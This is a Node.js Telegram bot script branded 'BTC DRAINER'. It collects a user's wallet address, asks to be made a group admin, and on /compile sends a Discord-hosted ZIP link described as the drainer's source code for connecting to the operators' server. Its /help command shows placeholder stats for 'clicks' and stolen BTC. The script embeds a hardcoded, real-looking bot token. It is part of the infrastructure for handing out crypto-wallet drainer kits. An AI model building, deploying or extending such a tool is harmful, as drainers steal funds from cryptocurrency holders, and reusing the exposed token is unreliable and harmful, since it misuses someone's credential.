const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

// Replace 'YOUR_TOKEN' with your actual bot token
const token = '7089777447:AAFmrRxVEd_QWN7iRyfZmWxXPmIsQRgG0uI';

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

// Dictionary to store wallet addresses
const walletAddresses = {};

// Dictionary to store user states
const userStates = {};

// Function to generate a random 7-digit string
function generateRandomString() {
    return crypto.randomBytes(4).toString('hex').toUpperCase();
}

// Listen for /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    // Send welcome message and instructions
    const welcomeMessage = '\u{1F389} Welcome to BTC DRAINER! \u{1F389}\n\nWe\'re excited to have you here. To get started, please make me an admin in this group.\n\nOnce done, click the "Continue" button below to proceed.';
    const continueButton = {
        reply_markup: {
            inline_keyboard: [
                [
                    {
                        text: 'Continue',
                        callback_data: 'continue',
                    },
                ],
            ],
        },
    };

    bot.sendMessage(chatId, welcomeMessage, continueButton);
});

// Listen for callback queries
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const messageText = query.message.text;

    if (query.data === 'continue') {
        // Set user state to 'awaiting_wallet_address'
        userStates[chatId] = 'awaiting_wallet_address';

        // Send the question for wallet address
        bot.sendMessage(chatId, 'Please provide your Wallet Address:');
    }
});

// Listen for /compile command
bot.onText(/\/compile/, (msg) => {
    const chatId = msg.chat.id;

    // Send the source code message
    const sourceCodeMessage = '\u{1F50D} Here is the source code of the Drainer:\n\n[Compiled Drainer](https://cdn.discordapp.com/attachments/1238670664899235924/1238670743223402650/compile-file.zip?ex=66402186&is=663ed006&hm=901e913e5db446a88dbf85d60fe66f7adf4e72ba6d8b1285cedd171f48d34671&)\n\nInside the ZIP contains all the necessary files to connect to the our server. You can check README.md for instructions to setup your frontend.\n\nDownload the ZIP file and extract its contents.(this link will expire in 6 days)';
    bot.sendMessage(chatId, sourceCodeMessage, { parse_mode: 'Markdown' });
});

// Listen for /help command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;

    // Get the user's wallet address
    const userWalletAddress = walletAddresses[chatId] || 'ADDRESS HERE';

    // Generate a random 7-digit string for user ID
    const userId = generateRandomString();

    // Send the user info message with encoded emojis
    const userInfoMessage ='\u{1F4F1} User Info\n\n\u{1F3C6} Level: 1\n\u{1F396} Rank: Rookie\n\u{1F4EA} Your address: ' + userWalletAddress + '\nUSER ID: ' + userId + '\n\nStats\n\nClicks: 0\nConnections: 0\nLicks: 0 BTC';
    bot.sendMessage(chatId, userInfoMessage);

});

// Listen for any kind of message
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const messageText = msg.text;

    // Check user state
    if (userStates[chatId] === 'awaiting_wallet_address') {
        // Store the wallet address
        walletAddresses[chatId] = messageText;

        // Send a confirmation message with green checkmark emoji
        bot.sendMessage(chatId, '\u2705 Congratulations! Your Drainer has been fully initialized!\n\nYou can use the following commands:\n\n/compile - This command will send you a ZIP file containing the source code of the Drainer.\n/help - This command will provide you with the statistics of your drainer and other infos.');

        // Reset the state for this user
        delete userStates[chatId];
    }
});
